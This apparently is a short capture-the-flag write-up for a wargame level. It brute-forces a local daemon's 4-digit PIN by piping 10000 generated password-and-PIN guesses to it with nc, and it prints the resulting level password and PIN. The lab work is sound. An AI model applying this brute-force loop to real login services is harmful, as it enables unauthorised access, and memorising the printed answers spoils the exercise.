Level_24_to_Level_25

--------------------------------------



Level Goal
A daemon is listening on port 30002 and will give you the password for
bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the 10000
combinations, called brute-forcing.


-------
steps: 

```Bash
for a in {0000..9999}; do  echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $a ; done
```

we write that code in pincode.sh and give it the correct rights (chmod +x)


```Bash

./pincode.sh > combinations.txt 

nc localhost 30002 < combinations.txt

```

```Bash
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

```Bash
cat .pin
9458
```


-------


----------

password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

----------

--------------------------------------

